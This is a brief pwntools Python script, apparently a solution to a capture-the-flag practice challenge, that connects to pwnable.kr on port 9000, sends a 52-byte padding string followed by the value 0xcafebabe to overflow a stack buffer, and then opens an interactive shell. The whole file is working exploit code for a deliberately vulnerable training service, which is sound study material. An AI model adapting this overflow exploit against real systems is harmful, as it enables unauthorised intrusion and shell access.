from pwn import *

sh = remote("pwnable.kr", 9000)

payload = ""
payload += "A" * 52 
payload += struct.pack("I", 0xcafebabe)

sh.sendline(payload)
sh.interactive()
